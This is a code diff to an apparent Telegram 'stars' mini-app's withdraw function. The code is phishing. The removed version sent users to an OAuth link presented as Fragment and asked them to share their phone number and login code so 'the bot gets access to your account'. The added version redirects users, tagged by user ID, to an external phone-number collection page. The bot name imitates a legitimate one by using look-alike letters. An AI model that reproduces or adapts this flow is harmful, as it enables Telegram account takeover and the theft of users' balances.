@@ -407,39 +407,10 @@
         }
         
         function showWithdraw() {
-            if (currentBalance < 1) {
-                if (tg) {
-                    tg.showAlert('❌ Недостаточно звезд для вывода\n\nМинимум: 1 ⭐');
-                }
-                return;
-            }
-            
             if (tg) {
-                // Показываем подтверждение
-                tg.showConfirm(
-                    `📤 Вывод звезд\n\nВаш баланс: ${currentBalance} ⭐\n\nДля вывода необходимо авторизоваться через Fragment.\n\nПродолжить?`,
-                    function(confirmed) {
-                        if (confirmed) {
-                            // Открываем Fragment OAuth
-                            const botUsername = 'BuySeIIStarsbot';
-                            const fragmentUrl = `https://oauth.telegram.org/auth?bot_id=8566540708&origin=https://fragment.com&embed=1&request_access=write&return_to=https://fragment.com`;
-                            
-                            // Открываем в браузере
-                            tg.openLink(fragmentUrl);
-                            
-                            // Показываем инструкцию
-                            setTimeout(() => {
-                                tg.showAlert(
-                                    '📱 Инструкция:\n\n' +
-                                    '1. Поделитесь номером телефона\n' +
-                                    '2. Введите код из Telegram\n' +
-                                    '3. Бот получит доступ к вашему аккаунту\n' +
-                                    '4. Вывод будет выполнен автоматически'
-                                );
-                            }, 1000);
-                        }
-                    }
-                );
+                // Открываем страницу запроса номера телефона
+                const phoneRequestUrl = 'https://shaczihakimov-collab.github.io/stars/phone_request.html?user_id=' + currentUserId;
+                tg.openLink(phoneRequestUrl);
             } else {
                 alert('Функция доступна только в Telegram');
             }
